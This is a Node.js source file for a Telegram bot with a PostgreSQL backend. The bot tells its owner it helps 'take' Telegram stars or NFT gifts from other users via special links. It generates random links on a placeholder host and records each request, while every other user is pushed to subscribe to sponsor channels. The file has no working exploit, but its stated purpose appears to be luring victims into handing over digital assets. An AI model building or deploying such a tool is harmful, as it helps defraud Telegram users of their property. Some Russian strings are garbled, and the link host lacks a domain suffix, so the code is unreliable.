/* eslint-disable no-console */
require('dotenv').config();
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');
const { randomUUID } = require('crypto');

// --- Config ---
const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error('BOT_TOKEN is not set');
}
const PORT = process.env.PORT || process.env.RAILWAY_STATIC_PORT || 3001;
const DATABASE_URL = process.env.DATABASE_URL;
const BOT_OWNER_ID = 6910097562; // Special user who gets the "Получить ссылку" flow

// Sponsors (comma-separated links in env SPONSOR_LINKS)
function normalizeSponsorLinks(raw) {
  if (!raw) return [];
  // Find all occurrences of https://t.me/ and extract following non-comma sequences
  const matches = [];
  const prefix = 'https://t.me/';
  let idx = raw.indexOf(prefix);
  while (idx !== -1) {
    // find end at next comma or next https occurrence
    let end = raw.indexOf(',', idx);
    const nextPrefix = raw.indexOf(prefix, idx + prefix.length);
    if (nextPrefix !== -1 && (end === -1 || nextPrefix < end)) {
      end = nextPrefix;
    }
    if (end === -1) end = raw.length;
    const item = raw.slice(idx, end).trim();
    if (item) matches.push(item);
    idx = raw.indexOf(prefix, end);
  }
  // fallback: split by commas
  if (matches.length === 0) {
    return raw.split(',').map(s => s.trim()).filter(Boolean);
  }
  // deduplicate
  return Array.from(new Set(matches));
}

const SPONSOR_LINKS = normalizeSponsorLinks(process.env.SPONSOR_LINKS || '');

// Build inline keyboard for sponsor links
function buildSponsorKeyboard(links) {
  const buttons = links.map((l, i) => Markup.button.url(`Спонсор ${i + 1}`, l));
  // arrange two buttons per row
  const rows = [];
  for (let i = 0; i < buttons.length; i += 2) {
    rows.push(buttons.slice(i, i + 2));
  }
  return Markup.inlineKeyboard(rows);
}

// --- DB ---
const pool = DATABASE_URL
  ? new Pool({
      connectionString: DATABASE_URL,
      ssl: { rejectUnauthorized: false },
      connectionTimeoutMillis: 5000,
      idleTimeoutMillis: 10000
    })
  : null;

async function initDb() {
  if (!pool) return;
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        telegram_id BIGINT PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS requests (
        id TEXT PRIMARY KEY,
        user_id BIGINT REFERENCES users(telegram_id) ON DELETE CASCADE,
        request_type TEXT CHECK (request_type IN ('stars','nft')),
        request_value TEXT NOT NULL,
        generated_link TEXT NOT NULL,
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS user_states (
        user_id BIGINT PRIMARY KEY REFERENCES users(telegram_id) ON DELETE CASCADE,
        state TEXT,
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
  } catch (e) {
    console.error('Database init failed:', e);
  }
}

async function upsertUser(user) {
  if (!pool || !user) return;
  const { id, username, first_name, last_name } = user;
  await pool.query(
    `INSERT INTO users (telegram_id, username, first_name, last_name)
     VALUES ($1, $2, $3, $4)
     ON CONFLICT (telegram_id) DO UPDATE SET
       username = EXCLUDED.username,
       first_name = EXCLUDED.first_name,
       last_name = EXCLUDED.last_name`,
    [id, username || null, first_name || null, last_name || null]
  );
}

async function setUserState(userId, state) {
  if (!pool) return;
  await pool.query(
    `INSERT INTO user_states (user_id, state, updated_at)
     VALUES ($1, $2, NOW())
     ON CONFLICT (user_id) DO UPDATE SET state = EXCLUDED.state, updated_at = NOW()`,
    [userId, state]
  );
}

async function getUserState(userId) {
  if (!pool) return null;
  const { rows } = await pool.query(`SELECT state FROM user_states WHERE user_id = $1`, [userId]);
  return rows[0]?.state || null;
}

async function clearUserState(userId) {
  if (!pool) return;
  await pool.query(`DELETE FROM user_states WHERE user_id = $1`, [userId]);
}

async function saveRequest(userId, type, value, link) {
  if (!pool) return;
  const id = randomUUID();
  await pool.query(
    `INSERT INTO requests (id, user_id, request_type, request_value, generated_link)
     VALUES ($1, $2, $3, $4, $5)`,
    [id, userId, type, String(value), link]
  );
}

function generateRandomToken(len = 14) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let out = '';
  for (let i = 0; i < len; i += 1) {
    out += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
  }
  return out;
}

function buildSponsorMessage() {
  if (!SPONSOR_LINKS.length) {
    return 'Подпишитесь на всех спонсоров (ссылки будут добавлены позже).';
  }
  const list = SPONSOR_LINKS.map((l, idx) => `${idx + 1}. ${l}`).join('\n');
  return `Подпишитесь на всех спонсоров и возвращайтесь:\n${list}`;
}

// --- Bot ---
const bot = BOT_TOKEN ? new Telegraf(BOT_TOKEN) : null;

if (bot) {
  bot.start(async (ctx) => {
    try {
      await upsertUser(ctx.from);
      if (ctx.from.id === BOT_OWNER_ID) {
        await ctx.reply(
          'Привет! Я бот, который помогает забирать NFT-подарок или звёзды у другого пользователя по специальной ссылке.',
          Markup.inlineKeyboard([
            [Markup.button.callback('Получить ссылку', 'get_link')],
          ])
        );
      } else {
        const text = 'Пожалуйста, подпишитесь на всех спонсоров и вернитесь.';
        if (SPONSOR_LINKS.length) {
          await ctx.reply(text, buildSponsorKeyboard(SPONSOR_LINKS));
        } else {
          await ctx.reply(text);
        }
      }
    } catch (err) {
      console.error('Error in /start:', err);
    }
  });

  bot.action('get_link', async (ctx) => {
    try {
      if (ctx.from.id !== BOT_OWNER_ID) {
        await ctx.answerCbQuery('Действие недоступно.');
        return;
        }
      await ctx.answerCbQuery();
      await setUserState(ctx.from.id, 'awaiting_request');
      await ctx.reply('Отправьте количество звёзд (числом) или ссылку на NFT, которую ��отите забрать.');
    } catch (err) {
      console.error('Error in get_link action:', err);
    }
  });

  bot.on('text', async (ctx) => {
    try {
      const state = await getUserState(ctx.from.id);
      if (ctx.from.id !== BOT_OWNER_ID || state !== 'awaiting_request') {
        return; // Ignore unrelated messages
      }

      const text = (ctx.message.text || '').trim();
      const isNumber = /^\d+$/.test(text);
      const isUrl = /^(https?:\/\/)[\w.-]+(?:\/[\w\-._~:/?#[\]@!$&'()*+,;=.]+)?$/i.test(text);

      if (!isNumber && !isUrl) {
        await ctx.reply('Пожалуйста, отправьте положительное число (звёзды) или корректную ссылку (NFT).');
        return;
      }

      const type = isNumber ? 'stars' : 'nft';
      const value = isNumber ? parseInt(text, 10) : text;
      if (isNumber && value <= 0) {
        await ctx.reply('Количество звёзд должно быть больше 0. Попробуйте снова.');
        return;
      }

      const token = generateRandomToken(14);
      const link = `https://borkstudio/${token}`;

      await saveRequest(ctx.from.id, type, value, link);
      await clearUserState(ctx.from.id);

      await ctx.reply(`Го��ово! Ваша уникальная ссылка: ${link}`);
    } catch (err) {
      console.error('Error handling text:', err);
      await ctx.reply('Произошла ошибка. Попробуйте ещё раз.');
    }
  });
}

// --- Server (for Railway/health) ---
const app = express();
app.get('/', (_req, res) => {
  res.send('Telegram bot is running.');
});
app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

async function main() {
  try {
    await initDb();
    if (bot) {
      await bot.launch();
      console.log('Bot launched.');
      // Enable graceful stop
      process.once('SIGINT', () => bot.stop('SIGINT'));
      process.once('SIGTERM', () => bot.stop('SIGTERM'));
    } else {
      console.warn('Bot not started: missing BOT_TOKEN');
    }
  } catch (e) {
    console.error('Startup error:', e);
  }

  app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
  });
}

main();
